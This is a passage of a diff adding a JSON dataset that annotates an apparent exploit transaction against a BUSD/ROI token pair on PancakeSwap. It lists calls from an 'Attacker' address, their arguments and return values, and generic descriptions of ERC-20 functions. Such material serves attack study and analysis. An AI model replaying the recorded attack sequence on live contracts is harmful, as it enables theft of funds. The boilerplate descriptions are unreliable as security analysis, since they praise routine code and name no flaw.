+        "description": "1. **Core function**:  \n   The main purpose of this function is to allow the owner of tokens to give permission to another address (called the \"spender\") to use a specific amount of their tokens. This is commonly used in decentralized applications where one party needs to authorize another to manage or transfer tokens on their behalf.\n\n2. **Security mechanism**:  \n   - The function uses `_msgSender()` to ensure that the caller is the actual owner of the tokens, preventing unauthorized access.  \n   - It overrides a standard function (`approve`) from a parent contract, ensuring compatibility with established token standards.  \n   - The function returns a boolean (`true`) to confirm that the approval was successful, providing a clear indication of the operation's outcome.\n\n3. **Parameter Function**:  \n   - `spender`: This is the address of the person or contract that is being given permission to use the tokens.  \n   - `amount`: This is the maximum number of tokens that the spender is allowed to use.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval process was completed successfully. This is a straightforward confirmation and does not involve complex calculations.  \n\nIn summary, this function allows a token owner to authorize another address to use a specific amount of their tokens, ensuring security through proper sender verification and providing a simple confirmation of success.",
+        "return_value": "true"
+    },
+    {
+        "id": "251954",
+        "args": "3986806268542825 [3.986e15], 0, [0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662613078 [1.662e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "325973382708620 [3.259e14], 50844234521281227427355 [5.084e22], 1662613078 [1.662e9]"
+    },
+    {
+        "id": "88966",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124], 3986806268542825 [3.986e15]",
+        "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `transferFrom` function is designed to move a specified amount of tokens from one account (`sender`) to another (`recipient`). It is commonly used in scenarios where a third party (the caller of this function) is authorized to transfer tokens on behalf of the `sender`. This function ensures that the transfer is executed and updates the allowance (the amount the sender has approved for the caller to spend).\n\n2. Security mechanism:  \nThe function includes several security measures:  \n- It uses the `override` keyword to ensure it correctly implements a standard interface.  \n- It calls `_transfer` to handle the actual token transfer, which likely includes checks to prevent invalid transfers.  \n- It uses `_approve` to reduce the caller's allowance by the transferred amount, ensuring the caller cannot spend more than authorized.  \n- It includes a safety check (`sub`) to ensure the transfer amount does not exceed the allowed limit, reverting the transaction if it does.  \n\n3. Parameter Function:  \n- `sender`: The address of the account from which tokens are being transferred.  \n- `recipient`: The address of the account receiving the tokens.  \n- `amount`: The number of tokens to be transferred from the `sender` to the `recipient`.  \n\n4. Return description:  \nThe function returns `true` if the transfer is successful. This indicates that the tokens were moved and the allowance was updated correctly. If any step fails (e.g., the transfer amount exceeds the allowance), the transaction is reverted, and no value is returned.  \n\nIn summary, the `transferFrom` function securely transfers tokens from one account to another while ensuring the caller does not exceed their approved spending limit. It returns `true` on success and reverts on failure.",
+        "return_value": "true"
+    },
+    {
+        "id": "38233",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4312779651251445 [4.312e15]"
+    },
+    {
+        "id": "3271",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 46992366331371533190745 [4.699e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "38233",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4312779651251445 [4.312e15]"
+    },
+    {
+        "id": "531",
+        "args": "BUSD/ROI Pair: [0x745D6Dd206906dd32b3f35E00533AD0963805124]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3851868189909694236610 [3.851e21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "334361473402502465911129 [3.343e23], 93297429499284008339976023 [9.329e25], 1662613078 [1.662e9]"
+    },
+    {
+        "id": "531",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "93344421865615379873166768 [9.334e25]"
+    },
+    {
+        "id": "38255",
+        "args": "167906931830792214995 [1.679e20], 0, PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 167906931830792214995 [1.679e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "334193566470671673696134 [3.341e23]"
+    },
+    {
+        "id": "531",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "93344421865615379873166768 [9.334e25]"
+    },
+    {
+        "id": "534",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+        "original_code": null,
+        "description": null,
+        "return_value": "167906931830792214995 [1.679e20]"
+    },
+    {
+        "id": "9223",
+        "args": "167906931830792214995 [1.679e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"----------------------------------------------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
